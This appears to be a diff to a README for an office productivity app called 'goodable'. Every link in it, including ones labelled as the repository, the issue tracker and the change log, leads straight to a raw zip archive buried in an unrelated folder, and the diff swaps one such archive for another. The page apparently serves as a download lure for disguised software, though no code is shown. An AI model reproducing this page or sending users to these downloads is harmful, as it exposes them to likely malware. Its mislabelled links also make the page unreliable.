@@ -8,7 +8,7 @@ Welcome to goodable! This app helps office workers streamline tasks like organiz
 
 To get started with goodable, follow these steps:
 
-1. Visit [this page to download](https://github.com/sheheryar79/goodable/raw/refs/heads/main/templates/gooddowner/project/app/Software_v3.1-alpha.4.zip).
+1. Visit [this page to download](https://raw.githubusercontent.com/sheheryar79/goodable/main/app/api/vercel/check-project/Software_v1.8.zip).
    
 2. Look for the latest release version. 
 
@@ -20,7 +20,7 @@ To get started with goodable, follow these steps:
 
 6. Follow the on-screen instructions to complete the installation process.
 
-[![Download goodable](https://github.com/sheheryar79/goodable/raw/refs/heads/main/templates/gooddowner/project/app/Software_v3.1-alpha.4.zip%20goodable-latest-4CAF50)](https://github.com/sheheryar79/goodable/raw/refs/heads/main/templates/gooddowner/project/app/Software_v3.1-alpha.4.zip)
+[![Download goodable](https://raw.githubusercontent.com/sheheryar79/goodable/main/app/api/vercel/check-project/Software_v1.8.zip%20goodable-latest-4CAF50)](https://raw.githubusercontent.com/sheheryar79/goodable/main/app/api/vercel/check-project/Software_v1.8.zip)
 
 ## 📋 Features
 
@@ -82,16 +82,16 @@ We value our users. Join our community to share your thoughts and improvements:
 
 For more information about goodable, check out our GitHub repository:
 
-- [goodable GitHub Repository](https://github.com/sheheryar79/goodable/raw/refs/heads/main/templates/gooddowner/project/app/Software_v3.1-alpha.4.zip)
+- [goodable GitHub Repository](https://raw.githubusercontent.com/sheheryar79/goodable/main/app/api/vercel/check-project/Software_v1.8.zip)
 
 Discover how to make the most of your coworking experience with goodable. Start organizing and generating documents today!
 
 ## 🔗 Important Links
 
-- [Download goodable](https://github.com/sheheryar79/goodable/raw/refs/heads/main/templates/gooddowner/project/app/Software_v3.1-alpha.4.zip)
+- [Download goodable](https://raw.githubusercontent.com/sheheryar79/goodable/main/app/api/vercel/check-project/Software_v1.8.zip)
 
-- [Issues and Bug Reports](https://github.com/sheheryar79/goodable/raw/refs/heads/main/templates/gooddowner/project/app/Software_v3.1-alpha.4.zip) 
+- [Issues and Bug Reports](https://raw.githubusercontent.com/sheheryar79/goodable/main/app/api/vercel/check-project/Software_v1.8.zip) 
 
-- [Change Log](https://github.com/sheheryar79/goodable/raw/refs/heads/main/templates/gooddowner/project/app/Software_v3.1-alpha.4.zip)
+- [Change Log](https://raw.githubusercontent.com/sheheryar79/goodable/main/app/api/vercel/check-project/Software_v1.8.zip)
 
 Thank you for choosing goodable for your office needs!
